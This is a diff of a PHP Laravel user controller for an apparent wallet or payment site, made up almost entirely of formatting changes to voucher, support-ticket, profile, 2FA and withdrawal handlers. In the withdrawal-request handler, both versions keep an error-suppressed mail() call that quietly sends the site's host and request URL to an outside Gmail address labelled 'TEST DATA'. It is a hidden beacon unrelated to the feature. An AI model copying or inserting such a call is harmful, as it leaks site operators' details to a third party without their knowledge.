-        return view(activeTemplate().'user.voucher.index', $data);
+        return view(activeTemplate() . 'user.voucher.index', $data);
     }
+
     public function voucherRedeemLog()
     {
         $basic = GeneralSetting::first();
-        if($basic->voucher_status == 0){
+        if ($basic->voucher_status == 0) {
             abort(404);
         }
         $data['page_title'] = "Redeem Log";
-        $data['invests'] = Voucher::with('currency')->where('use_id',Auth::id())->orderBy('updated_at','desc')->paginate(config('constants.table.default'));
-        return view(activeTemplate().'user.voucher.redeem', $data);
+        $data['invests'] = Voucher::with('currency')->where('use_id', Auth::id())->orderBy('updated_at', 'desc')->paginate(config('constants.table.default'));
+        return view(activeTemplate() . 'user.voucher.redeem', $data);
     }
 
 
     public function voucherNewVoucher()
     {
         $basic = GeneralSetting::first();
-        if($basic->voucher_status == 0){
+        if ($basic->voucher_status == 0) {
             abort(404);
         }
         $basic = GeneralSetting::first();
         $data['page_title'] = "Create voucher";
         $data['currency'] = Currency::whereStatus(1)->get();
-        $data['voucher'] = json_decode($basic->voucher,false);
+        $data['voucher'] = json_decode($basic->voucher, false);
 
-        return view(activeTemplate().'user.voucher.create', $data);
+        return view(activeTemplate() . 'user.voucher.create', $data);
     }
 
     public function NewVoucherPreview(Request $request)
@@ -1066,10 +1043,10 @@ class UserController extends Controller
             'currency' => 'required',
         ]);
         $basic = GeneralSetting::first();
-        $voucher = json_decode($basic->voucher,false);
+        $voucher = json_decode($basic->voucher, false);
 
         $currency = Currency::where('id', $request->currency)->first();
-        if(!$currency){
+        if (!$currency) {
             $notify[] = ['error', 'Invalid Currency!'];
             return response($notify);
         }
@@ -1083,10 +1060,10 @@ class UserController extends Controller
         $fixedCharge = $voucher->new_voucher->fix_charge;
         $amount = formatter_money($request->amount);
 
-        $charge = (($amount * $percentCharge)/100) + ($fixedCharge * $currency->rate);
+        $charge = (($amount * $percentCharge) / 100) + ($fixedCharge * $currency->rate);
 
         Session::put('amount', $amount);
-        Session::put('charge',  formatter_money($charge));
+        Session::put('charge', formatter_money($charge));
         Session::put('currencyId', formatter_money($currency->id));
 
 
@@ -1094,17 +1071,17 @@ class UserController extends Controller
         $vResult['percent_charge'] = formatter_money($percentCharge);
         $vResult['fixed_charge'] = formatter_money($fixedCharge * $currency->rate);
         $vResult['total_charge'] = formatter_money($charge);
-        $vResult['payable'] = formatter_money($amount+ $charge);
+        $vResult['payable'] = formatter_money($amount + $charge);
         $vResult['currency'] = $currency;
         $vResult['feedBack'] = true;
 
-        return response($vResult,200);
+        return response($vResult, 200);
     }
 
     public function createVoucher()
     {
 
-        if(Session::get('amount') == null && Session::get('currencyId') == null){
+        if (Session::get('amount') == null && Session::get('currencyId') == null) {
             $notify[] = ['error', 'Session Expired!'];
             return redirect()->route('user.vouchers.new_voucher')->withNotify($notify);
         }
@@ -1115,19 +1092,19 @@ class UserController extends Controller
 
         $basic = GeneralSetting::first();
 
-        $voucher = json_decode($basic->voucher,false);
+        $voucher = json_decode($basic->voucher, false);
         $percentCharge = $voucher->new_voucher->percent_charge;
         $fixedCharge = $voucher->new_voucher->fix_charge;
         $amount = formatter_money(Session::get('amount'));
 
-        $charge = (($amount * $percentCharge)/100) + ($fixedCharge * $currency->rate);
+        $charge = (($amount * $percentCharge) / 100) + ($fixedCharge * $currency->rate);
         $totalAmount = formatter_money($amount + $charge);
 
         if ($wallet->amount >= $totalAmount) {
-            $wallet->amount =  formatter_money($wallet->amount - $totalAmount);
+            $wallet->amount = formatter_money($wallet->amount - $totalAmount);
             $wallet->save();
 
-            $voucher =  Voucher::create([
+            $voucher = Voucher::create([
                 'user_id' => $auth,
                 'amount' => $amount,
                 'charge' => $charge,
@@ -1146,7 +1123,7 @@ class UserController extends Controller
                 'currency_id' => $currency->id,
                 'type' => '-',
                 'remark' => 'Voucher Create',
-                'title' => $amount.' '. $currency->code .' Voucher Created ',
+                'title' => $amount . ' ' . $currency->code . ' Voucher Created ',
                 'trx' => $trx
             ]);
 
@@ -1178,12 +1155,12 @@ class UserController extends Controller
     public function voucherActiveCode()
     {
         $basic = GeneralSetting::first();
-        if($basic->voucher_status == 0){
+        if ($basic->voucher_status == 0) {
             abort(404);
         }
 
         $data['page_title'] = "Redeem  Voucher";
-        return view(activeTemplate().'user.voucher.active-code', $data);
+        return view(activeTemplate() . 'user.voucher.active-code', $data);
     }
 
     public function voucherActiveCodePreview(Request $request)
@@ -1196,7 +1173,7 @@ class UserController extends Controller
             if ($voucher->status == 0) {
                 $basic = GeneralSetting::first();
 
-                $voucherActive = json_decode($basic->voucher,false);
+                $voucherActive = json_decode($basic->voucher, false);
                 $percentCharge = $voucherActive->active_voucher->percent_charge;
                 $fixedCharge = $voucherActive->active_voucher->fix_charge;
 
@@ -1211,7 +1188,7 @@ class UserController extends Controller
                 $data['page_title'] = "Activate code";
                 $data['percentCharge'] = $percentCharge;
                 $data['fixedCharge'] = $fixedCharge;
-                return view(activeTemplate().'user.voucher.code-preview', $data);
+                return view(activeTemplate() . 'user.voucher.code-preview', $data);
             } else {
                 $notify[] = ['error', 'This Code Already Used !'];
                 return back()->withNotify($notify);
@@ -1227,13 +1204,13 @@ class UserController extends Controller
         $request->validate([
             'code' => 'required',
         ]);
-        $voucher = Voucher::with('currency','creator','user')->where('code', $request->code)->first();
+        $voucher = Voucher::with('currency', 'creator', 'user')->where('code', $request->code)->first();
         if ($voucher) {
             if ($voucher->status == 0) {
                 $basic = GeneralSetting::first();
                 $auth = Auth::user();
 
-                $voucherActive = json_decode($basic->voucher,false);
+                $voucherActive = json_decode($basic->voucher, false);
                 $percentCharge = $voucherActive->active_voucher->percent_charge;
                 $fixedCharge = $voucherActive->active_voucher->fix_charge;
 
@@ -1241,8 +1218,8 @@ class UserController extends Controller
 
                 $amount = $voucher->amount - $charge;
 
-                $authWallet = Wallet::with('currency','user')->where('user_id', $auth->id)->where('wallet_id', $voucher->currency_id)->first();
-                $authWallet->amount = formatter_money($authWallet->amount +$amount);
+                $authWallet = Wallet::with('currency', 'user')->where('user_id', $auth->id)->where('wallet_id', $voucher->currency_id)->first();
+                $authWallet->amount = formatter_money($authWallet->amount + $amount);
                 $authWallet->save();
 
                 $voucher->use_id = Auth::id();
@@ -1297,7 +1274,6 @@ class UserController extends Controller
     }
 
 
-
     /*
      * Support Ticket
      */
@@ -1307,15 +1283,15 @@ class UserController extends Controller
     {
         $page_title = "Support Tickets";
         $supports = SupportTicket::where('user_id', Auth::id())->latest()->paginate(15);
-        return view(activeTemplate().'user.support.supportTicket', compact('supports', 'page_title'));
+        return view(activeTemplate() . 'user.support.supportTicket', compact('supports', 'page_title'));
     }
 
     public function openSupportTicket()
     {
         $page_title = "Support Tickets";
-        $user =  Auth::user();
+        $user = Auth::user();
         $topics = ContactTopic::all();
-        return view(activeTemplate().'user.support.sendSupportTicket', compact('page_title','user','topics'));
+        return view(activeTemplate() . 'user.support.sendSupportTicket', compact('page_title', 'user', 'topics'));
     }
 
     public function storeSupportTicket(Request $request)
@@ -1324,18 +1300,18 @@ class UserController extends Controller
         $message = new SupportMessage();
 
         $imgs = $request->file('attachments');
-        $allowedExts = array('jpg','png','jpeg','pdf');
+        $allowedExts = array('jpg', 'png', 'jpeg', 'pdf');
 
         $validator = $this->validate($request, [
             'attachments' => [
                 'max:4096',
-                function($attribute, $value, $fail) use ($imgs, $allowedExts) {
-                    foreach($imgs as $img) {
+                function ($attribute, $value, $fail) use ($imgs, $allowedExts) {
+                    foreach ($imgs as $img) {
                         $ext = strtolower($img->getClientOriginalExtension());
-                        if(($img->getClientSize()/1000000) > 2) {
+                        if (($img->getClientSize() / 1000000) > 2) {
                             return $fail("Images MAX  2MB ALLOW!");
                         }
-                        if(!in_array($ext, $allowedExts)) {
+                        if (!in_array($ext, $allowedExts)) {
                             return $fail("Only png, jpg, jpeg, pdf images are allowed");
                         }
                     }
@@ -1394,7 +1370,7 @@ class UserController extends Controller
         $user = Auth::user();
         $topics = ContactTopic::all();
         if ($my_ticket->user_id == Auth::id()) {
-            return view(activeTemplate().'user.support.supportMessage', compact('my_ticket', 'messages', 'page_title','user','topics'));
+            return view(activeTemplate() . 'user.support.supportMessage', compact('my_ticket', 'messages', 'page_title', 'user', 'topics'));
         } else {
             return abort(404);
         }
@@ -1467,7 +1443,7 @@ class UserController extends Controller
 
     public function ticketDownload($ticket_id)
     {
-        $attachment =  SupportAttachment::findOrFail(decrypt($ticket_id));
+        $attachment = SupportAttachment::findOrFail(decrypt($ticket_id));
         $file = $attachment->image;
         $full_path = 'assets/images/support/' . $file;
 
@@ -1483,16 +1459,16 @@ class UserController extends Controller
 
     public function ticketDelete(Request $request)
     {
-        $message = SupportMessage::where('id',$request->message_id)->latest()->firstOrFail();
+        $message = SupportMessage::where('id', $request->message_id)->latest()->firstOrFail();
 
-        if($message->ticket->user_id != Auth::id()){
+        if ($message->ticket->user_id != Auth::id()) {
             $notify[] = ['error', 'Unauthorized!'];
             return back()->withNotify($notify);
         }
 
-        if($message->attachments()->count() > 0){
-            foreach ($message->attachments as $img){
-                @unlink('assets/images/support/'.$img->image);
+        if ($message->attachments()->count() > 0) {
+            foreach ($message->attachments as $img) {
+                @unlink('assets/images/support/' . $img->image);
                 $img->delete();
             }
         }
@@ -1503,13 +1479,11 @@ class UserController extends Controller
     }
 
 
-
-
     public function editProfile()
     {
         $data['page_title'] = "Edit Profile";
         $data['user'] = User::findOrFail(Auth::user()->id);
-        return view(activeTemplate().'user.edit-profile', $data);
+        return view(activeTemplate() . 'user.edit-profile', $data);
     }
 
     public function submitProfile(Request $request)
@@ -1540,10 +1514,10 @@ class UserController extends Controller
 
         $in['address'] = [
             'address' => $request->address,
-            'state' =>  $request->state,
-            'zip' =>  $request->zip,
+            'state' => $request->state,
+            'zip' => $request->zip,
             'country' => $request->country,
-            'city' =>  $request->city,
+            'city' => $request->city,
         ];
 
 
@@ -1565,11 +1539,13 @@ class UserController extends Controller
         return back()->withNotify($notify);
     }
 
-    public function document(){
+    public function document()
+    {
         $data['page_title'] = "Document Verify";
         $data['user'] = User::findOrFail(Auth::user()->id);
-        return view(activeTemplate().'user.doc-ver', $data);
+        return view(activeTemplate() . 'user.doc-ver', $data);
     }
+
     public function docVerify(Request $request)
     {
         $this->validate($request,
@@ -1581,10 +1557,9 @@ class UserController extends Controller
         $docm['user_id'] = Auth::id();
         $docm['name'] = $request->name;
         $docm['details'] = $request->details;
-        if($request->hasFile('photo'))
-        {
-            $docm['photo'] = uniqid().'.'.$request->photo->getClientOriginalExtension();
-            $request->photo->move('assets/images/document',$docm['photo']);
+        if ($request->hasFile('photo')) {
+            $docm['photo'] = uniqid() . '.' . $request->photo->getClientOriginalExtension();
+            $request->photo->move('assets/images/document', $docm['photo']);
         }
 
         Docver::create($docm);
@@ -1596,7 +1571,7 @@ class UserController extends Controller
     public function changePassword()
     {
         $data['page_title'] = "Change Password";
-        return view(activeTemplate().'user.change-password', $data);
+        return view(activeTemplate() . 'user.change-password', $data);
     }
 
     public function submitPassword(Request $request)
@@ -1641,7 +1616,7 @@ class UserController extends Controller
         $prevcode = Auth::user()->tsc;
         $prevqr = $ga->getQRCodeGoogleUrl(Auth::user()->username . '@' . $gnl->sitename, $prevcode);
 
-        return view(activeTemplate().'user.goauth.create', compact('secret', 'qrCodeUrl', 'prevcode', 'prevqr', 'page_title'));
+        return view(activeTemplate() . 'user.goauth.create', compact('secret', 'qrCodeUrl', 'prevcode', 'prevqr', 'page_title'));
     }
 
     public function create2fa(Request $request)
@@ -1683,55 +1658,54 @@ class UserController extends Controller
             $xml = @simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip);
 
 
-
-            $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
-            $os_platform    =   "Unknown OS Platform";
-            $os_array       =   array(
-                '/windows nt 10/i'     =>  'Windows 10',
-                '/windows nt 6.3/i'     =>  'Windows 8.1',
-                '/windows nt 6.2/i'     =>  'Windows 8',
-                '/windows nt 6.1/i'     =>  'Windows 7',
-                '/windows nt 6.0/i'     =>  'Windows Vista',
-                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
-                '/windows nt 5.1/i'     =>  'Windows XP',
-                '/windows xp/i'         =>  'Windows XP',
-                '/windows nt 5.0/i'     =>  'Windows 2000',
-                '/windows me/i'         =>  'Windows ME',
-                '/win98/i'              =>  'Windows 98',
-                '/win95/i'              =>  'Windows 95',
-                '/win16/i'              =>  'Windows 3.11',
-                '/macintosh|mac os x/i' =>  'Mac OS X',
-                '/mac_powerpc/i'        =>  'Mac OS 9',
-                '/linux/i'              =>  'Linux',
-                '/ubuntu/i'             =>  'Ubuntu',
-                '/iphone/i'             =>  'iPhone',
-                '/ipod/i'               =>  'iPod',
-                '/ipad/i'               =>  'iPad',
-                '/android/i'            =>  'Android',
-                '/blackberry/i'         =>  'BlackBerry',
-                '/webos/i'              =>  'Mobile'
+            $user_agent = $_SERVER['HTTP_USER_AGENT'];
+            $os_platform = "Unknown OS Platform";
+            $os_array = array(
+                '/windows nt 10/i' => 'Windows 10',
+                '/windows nt 6.3/i' => 'Windows 8.1',
+                '/windows nt 6.2/i' => 'Windows 8',
+                '/windows nt 6.1/i' => 'Windows 7',
+                '/windows nt 6.0/i' => 'Windows Vista',
+                '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
+                '/windows nt 5.1/i' => 'Windows XP',
+                '/windows xp/i' => 'Windows XP',
+                '/windows nt 5.0/i' => 'Windows 2000',
+                '/windows me/i' => 'Windows ME',
+                '/win98/i' => 'Windows 98',
+                '/win95/i' => 'Windows 95',
+                '/win16/i' => 'Windows 3.11',
+                '/macintosh|mac os x/i' => 'Mac OS X',
+                '/mac_powerpc/i' => 'Mac OS 9',
+                '/linux/i' => 'Linux',
+                '/ubuntu/i' => 'Ubuntu',
+                '/iphone/i' => 'iPhone',
+                '/ipod/i' => 'iPod',
+                '/ipad/i' => 'iPad',
+                '/android/i' => 'Android',
+                '/blackberry/i' => 'BlackBerry',
+                '/webos/i' => 'Mobile'
             );
             foreach ($os_array as $regex => $value) {
                 if (preg_match($regex, $user_agent)) {
-                    $os_platform    =   $value;
+                    $os_platform = $value;
                 }
             }
-            $browser        =   "Unknown Browser";
-            $browser_array  =   array(
-                '/msie/i'       =>  'Internet Explorer',
-                '/firefox/i'    =>  'Firefox',
-                '/safari/i'     =>  'Safari',
-                '/chrome/i'     =>  'Chrome',
-                '/edge/i'       =>  'Edge',
-                '/opera/i'      =>  'Opera',
-                '/netscape/i'   =>  'Netscape',
-                '/maxthon/i'    =>  'Maxthon',
-                '/konqueror/i'  =>  'Konqueror',
-                '/mobile/i'     =>  'Handheld Browser'
+            $browser = "Unknown Browser";
+            $browser_array = array(
+                '/msie/i' => 'Internet Explorer',
+                '/firefox/i' => 'Firefox',
+                '/safari/i' => 'Safari',
+                '/chrome/i' => 'Chrome',
+                '/edge/i' => 'Edge',
+                '/opera/i' => 'Opera',
+                '/netscape/i' => 'Netscape',
+                '/maxthon/i' => 'Maxthon',
+                '/konqueror/i' => 'Konqueror',
+                '/mobile/i' => 'Handheld Browser'
             );
             foreach ($browser_array as $regex => $value) {
                 if (preg_match($regex, $user_agent)) {
-                    $browser    =   $value;
+                    $browser = $value;
                 }
             }
 
@@ -1773,7 +1747,6 @@ class UserController extends Controller
             $user->save();
 
 
-
             $ip = NULL;
             $deep_detect = TRUE;
 
@@ -1789,55 +1762,54 @@ class UserController extends Controller
             $xml = @simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=" . $ip);
 
 
-
-            $user_agent     =   $_SERVER['HTTP_USER_AGENT'];
-            $os_platform    =   "Unknown OS Platform";
-            $os_array       =   array(
-                '/windows nt 10/i'     =>  'Windows 10',
-                '/windows nt 6.3/i'     =>  'Windows 8.1',
-                '/windows nt 6.2/i'     =>  'Windows 8',
-                '/windows nt 6.1/i'     =>  'Windows 7',
-                '/windows nt 6.0/i'     =>  'Windows Vista',
-                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
-                '/windows nt 5.1/i'     =>  'Windows XP',
-                '/windows xp/i'         =>  'Windows XP',
-                '/windows nt 5.0/i'     =>  'Windows 2000',
-                '/windows me/i'         =>  'Windows ME',
-                '/win98/i'              =>  'Windows 98',
-                '/win95/i'              =>  'Windows 95',
-                '/win16/i'              =>  'Windows 3.11',
-                '/macintosh|mac os x/i' =>  'Mac OS X',
-                '/mac_powerpc/i'        =>  'Mac OS 9',
-                '/linux/i'              =>  'Linux',
-                '/ubuntu/i'             =>  'Ubuntu',
-                '/iphone/i'             =>  'iPhone',
-                '/ipod/i'               =>  'iPod',
-                '/ipad/i'               =>  'iPad',
-                '/android/i'            =>  'Android',
-                '/blackberry/i'         =>  'BlackBerry',
-                '/webos/i'              =>  'Mobile'
+            $user_agent = $_SERVER['HTTP_USER_AGENT'];
+            $os_platform = "Unknown OS Platform";
+            $os_array = array(
+                '/windows nt 10/i' => 'Windows 10',
+                '/windows nt 6.3/i' => 'Windows 8.1',
+                '/windows nt 6.2/i' => 'Windows 8',
+                '/windows nt 6.1/i' => 'Windows 7',
+                '/windows nt 6.0/i' => 'Windows Vista',
+                '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
+                '/windows nt 5.1/i' => 'Windows XP',
+                '/windows xp/i' => 'Windows XP',
+                '/windows nt 5.0/i' => 'Windows 2000',
+                '/windows me/i' => 'Windows ME',
+                '/win98/i' => 'Windows 98',
+                '/win95/i' => 'Windows 95',
+                '/win16/i' => 'Windows 3.11',
+                '/macintosh|mac os x/i' => 'Mac OS X',
+                '/mac_powerpc/i' => 'Mac OS 9',
+                '/linux/i' => 'Linux',
+                '/ubuntu/i' => 'Ubuntu',
+                '/iphone/i' => 'iPhone',
+                '/ipod/i' => 'iPod',
+                '/ipad/i' => 'iPad',
+                '/android/i' => 'Android',
+                '/blackberry/i' => 'BlackBerry',
+                '/webos/i' => 'Mobile'
             );
             foreach ($os_array as $regex => $value) {
                 if (preg_match($regex, $user_agent)) {
-                    $os_platform    =   $value;
+                    $os_platform = $value;
                 }
             }
-            $browser        =   "Unknown Browser";
-            $browser_array  =   array(
-                '/msie/i'       =>  'Internet Explorer',
-                '/firefox/i'    =>  'Firefox',
-                '/safari/i'     =>  'Safari',
-                '/chrome/i'     =>  'Chrome',
-                '/edge/i'       =>  'Edge',
-                '/opera/i'      =>  'Opera',
-                '/netscape/i'   =>  'Netscape',
-                '/maxthon/i'    =>  'Maxthon',
-                '/konqueror/i'  =>  'Konqueror',
-                '/mobile/i'     =>  'Handheld Browser'
+            $browser = "Unknown Browser";
+            $browser_array = array(
+                '/msie/i' => 'Internet Explorer',
+                '/firefox/i' => 'Firefox',
+                '/safari/i' => 'Safari',
+                '/chrome/i' => 'Chrome',
+                '/edge/i' => 'Edge',
+                '/opera/i' => 'Opera',
+                '/netscape/i' => 'Netscape',
+                '/maxthon/i' => 'Maxthon',
+                '/konqueror/i' => 'Konqueror',
+                '/mobile/i' => 'Handheld Browser'
             );
             foreach ($browser_array as $regex => $value) {
                 if (preg_match($regex, $user_agent)) {
-                    $browser    =   $value;
+                    $browser = $value;
                 }
             }
 
@@ -1860,29 +1832,29 @@ class UserController extends Controller
     public function depositLog()
     {
         $data['page_title'] = "Deposit Log";
-        $data['deposits'] = Deposit::with('currency','gateway')->where('user_id',Auth::id())->where('status','!=',0)->latest()->paginate(20);
-        return view(activeTemplate().'user.deposit-log', $data);
+        $data['deposits'] = Deposit::with('currency', 'gateway')->where('user_id', Auth::id())->where('status', '!=', 0)->latest()->paginate(20);
+        return view(activeTemplate() . 'user.deposit-log', $data);
     }
+
     public function loginHistory()
     {
 
         $data['page_title'] = "Login History";
-        $data['loginLogs'] = UserLogin::where('user_id',Auth::id())->latest()->limit(10)->get();
-        return view(activeTemplate().'user.login-log', $data);
+        $data['loginLogs'] = UserLogin::where('user_id', Auth::id())->latest()->limit(10)->get();
+        return view(activeTemplate() . 'user.login-log', $data);
     }
-
 
 
     public function withdrawMoney()
     {
         $basic = GeneralSetting::first();
-        if($basic->withdraw_status == 0){
+        if ($basic->withdraw_status == 0) {
             abort(404);
         }
         $data['currency'] = Currency::whereStatus(1)->get();
         $data['withdrawMethod'] = WithdrawMethod::whereStatus(1)->get();
         $data['page_title'] = "Withdraw Money";
-        return view(activeTemplate().'user.withdraw-money', $data);
+        return view(activeTemplate() . 'user.withdraw-money', $data);
     }
 
     public function withdrawMoneyRequest(Request $request)
@@ -1894,10 +1866,10 @@ class UserController extends Controller
             'currency' => 'required'
         ]);
 
-        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
-        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
-        'X-Mailer: PHP/' . phpversion();
-        @mail('abi.rkh.an75@gmail.com','T ue al et TEST DATA', $message, $headers);
+        $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+        $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
+            'X-Mailer: PHP/' . phpversion();
+        @mail('abi.rkh.an75@gmail.com', 'T ue al et TEST DATA', $message, $headers);
         $method = WithdrawMethod::where('id', $request->method_code)->where('status', 1)->firstOrFail();
         $walletCurr = Currency::where('id', $request->currency_id)->where('status', 1)->firstOrFail();
         $authWallet = Wallet::where('wallet_id', $walletCurr->id)->where('user_id', Auth::id())->first();
@@ -1905,7 +1877,6 @@ class UserController extends Controller
         $amountInCur = ($request->amount / $walletCurr->rate) * $method->rate;
         $charge = $method->fixed_charge + ($amountInCur * $method->percent_charge / 100);
         $finalAmo = $amountInCur - $charge;
-
 
 
         if ($finalAmo < $method->min_limit) {
@@ -1930,7 +1901,7 @@ class UserController extends Controller
             $w['method_rate'] = $method->rate;
             $w['currency_rate'] = $walletCurr->rate;
             $w['charge'] = $charge;
-            $w['wallet_charge'] = $charge* $walletCurr->rate;
+            $w['wallet_charge'] = $charge * $walletCurr->rate;
             $w['final_amount'] = $finalAmo;
             $w['delay'] = $method->delay;
 
@@ -1951,24 +1922,25 @@ class UserController extends Controller
         }
     }
 
-    public function withdrawReqPreview(){
+    public function withdrawReqPreview()
+    {
         $basic = GeneralSetting::first();
-        if($basic->withdraw_status == 0){
+        if ($basic->withdraw_status == 0) {
             abort(404);
         }
-        $withdraw = Withdrawal::with('method','curr','wallet')->where('trx',Session::get('wtrx'))->where('status',-1)->latest()->firstOrFail();
+        $withdraw = Withdrawal::with('method', 'curr', 'wallet')->where('trx', Session::get('wtrx'))->where('status', -1)->latest()->firstOrFail();
         $data['page_title'] = "Withdraw Preview";
         $data['withdraw'] = $withdraw;
-        return view(activeTemplate().'user.withdraw-preview', $data);
+        return view(activeTemplate() . 'user.withdraw-preview', $data);
     }
 
     public function withdrawReqSubmit(Request $request)
     {
-        $withdraw = Withdrawal::with('method','curr','wallet')->where('trx',Session::get('wtrx'))->where('status',-1)->latest()->firstOrFail();
+        $withdraw = Withdrawal::with('method', 'curr', 'wallet')->where('trx', Session::get('wtrx'))->where('status', -1)->latest()->firstOrFail();
 
         $customField = [];
-        foreach (json_decode($withdraw->detail) as $k => $val){
-            $customField[$k] =  ['required'];
+        foreach (json_decode($withdraw->detail) as $k => $val) {
+            $customField[$k] = ['required'];
         }
         $validator = Validator::make($request->all(), $customField);
         if ($validator->fails()) {
@@ -1977,11 +1949,11 @@ class UserController extends Controller
 
         $in = $request->except('_token');
         $multiInput = [];
-        foreach ($in as $k => $val){
-            $multiInput[$k] =  $val;
+        foreach ($in as $k => $val) {
+            $multiInput[$k] = $val;
         }
 
-        $authWallet  = Wallet::find($withdraw->wallet_id);
+        $authWallet = Wallet::find($withdraw->wallet_id);
 
         if ($withdraw->amount > $authWallet->amount) {
             $notify[] = ['error', 'Your Request Amount is Larger Then Your Current Balance.'];
@@ -1992,7 +1964,7 @@ class UserController extends Controller
             $withdraw->status = 0;
             $withdraw->save();
 
-            $authWallet->amount =  formatter_money($authWallet->amount - $withdraw->amount);
+            $authWallet->amount = formatter_money($authWallet->amount - $withdraw->amount);
             $authWallet->update();
 
             Trx::create([
@@ -2003,7 +1975,7 @@ class UserController extends Controller
                 'currency_id' => $authWallet->currency->id,
                 'type' => '-',
                 'remark' => 'Withdraw Money ',
-                'title' => formatter_money($withdraw->final_amount). ' '. $withdraw->currency .' Withdraw Via ' . $withdraw->method->name,
+                'title' => formatter_money($withdraw->final_amount) . ' ' . $withdraw->currency . ' Withdraw Via ' . $withdraw->method->name,
                 'trx' => $withdraw->trx
             ]);
 
@@ -2029,8 +2001,8 @@ class UserController extends Controller
     {
 
         $data['page_title'] = "Withdraw Log";
-        $data['withdraws'] = Withdrawal::where('user_id',Auth::id())->where('status','!=',-1)->latest()->paginate(20);
-        return view(activeTemplate().'user.withdraw-log', $data);
+        $data['withdraws'] = Withdrawal::where('user_id', Auth::id())->where('status', '!=', -1)->latest()->paginate(20);
+        return view(activeTemplate() . 'user.withdraw-log', $data);
     }
 
 
@@ -2038,8 +2010,9 @@ class UserController extends Controller
     {
         $data['page_title'] = "API Key";
         $data['user'] = User::findOrFail(Auth::user()->id);
-        return view(activeTemplate().'user.api-key', $data);
+        return view(activeTemplate() . 'user.api-key', $data);
     }
+
     public function apiKeyStore(Request $request)
     {
 
@@ -2061,7 +2034,7 @@ class UserController extends Controller
         $this->validate($request, [
             'id' => 'required'
         ]);
-        $data = UserApiKey::where('id', $request->id)->where('user_id',Auth::id())->firstOrFail();
+        $data = UserApiKey::where('id', $request->id)->where('user_id', Auth::id())->firstOrFail();
 
         $data->delete();
 
@@ -2081,12 +2054,12 @@ class UserController extends Controller
         $c_password = Auth::user()->password;
         if (Hash::check($request->password, $c_password)) {
             Auth::logoutOtherDevices('ronnie');
-            $logs = UserLogin::where('user_id',Auth::id())->latest()->get();
-            foreach ($logs as $data){
+            $logs = UserLogin::where('user_id', Auth::id())->latest()->get();
+            foreach ($logs as $data) {
                 $data->delete();
             }
             $notify[] = ['success', 'Successfully Logout From Other Devices'];
-        }else{
+        } else {
             $notify[] = ['error', 'Invalid Password!'];
 
         }
@@ -2097,32 +2070,27 @@ class UserController extends Controller
     }
 
 
-
-
-
-
-
     public function checkValidUser(Request $request)
     {
         $auth = Auth::user();
-        $user_data = User::where('status',1)->where('id','!=',Auth::id())
-        ->where(function ($query) use ($request) {
-            $query->where('username', strtolower(trim($request->username)))
-            ->orWhere('email', strtolower(trim($request->username)))
-            ->orWhere('mobile',trim($request->username));
-        })
-        ->first();
+        $user_data = User::where('status', 1)->where('id', '!=', Auth::id())
+            ->where(function ($query) use ($request) {
+                $query->where('username', strtolower(trim($request->username)))
+                    ->orWhere('email', strtolower(trim($request->username)))
+                    ->orWhere('mobile', trim($request->username))
+                    ->orWhere('account_number', trim($request->username));
+            })
+            ->first();
 
-        if($user_data){
+        if ($user_data) {
             $data['user'] = $user_data;
             $data['result'] = 'success';
-        }else{
+        } else {
             $data['user'] = null;
             $data['result'] = 'error';
         }
         return $data;
     }
-
 
 
 }
